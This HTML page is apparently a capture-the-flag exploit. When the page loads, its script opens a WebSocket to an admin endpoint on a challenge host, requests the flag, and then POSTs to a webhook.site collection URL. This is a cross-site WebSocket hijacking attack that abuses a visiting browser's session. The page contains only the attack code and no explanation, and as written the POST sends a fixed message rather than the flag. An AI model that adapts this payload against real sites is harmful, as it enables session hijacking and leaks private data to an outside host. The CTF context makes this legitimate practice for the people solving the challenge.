<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Retrieve and Send Simple POST</title>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const wsUrl = 'ws://ce441-web.spchallenge.ir:8080/admin/ws';
            const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a';

            // Open WebSocket connection
            console.log('Opening WebSocket connection...');
            const ws = new WebSocket(wsUrl);

            ws.onopen = () => {
                console.log('WebSocket connection opened');
                ws.send('flag'); // Request the flag
            };

            ws.onmessage = (event) => {
                console.log('Received WebSocket message:', event.data);

                if (event.data.includes('flag{')) {
                    const flag = event.data;
                    console.log('Flag received:', flag);

                    // Send a simple POST request to the webhook
                    console.log('Sending simple POST to the webhook...');
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ message: 'POST request sent successfully' }),
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log('POST request sent successfully');
                        } else {
                            console.error('Failed to send POST. Response status:', response.status);
                        }
                    })
                    .catch(error => {
                        console.error('Error sending POST:', error);
                    });
                } else {
                    console.warn('No valid flag found in the WebSocket message');
                }
            };

            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };

            ws.onclose = () => {
                console.log('WebSocket connection closed');
            };
        });
    </script>
</head>
<body>
    <h1>Retrieve and Send Simple POST</h1>
    <p>The flag will be retrieved, and a simple POST request will be sent to the webhook when the page loads. Check the console for details.</p>
</body>
</html>
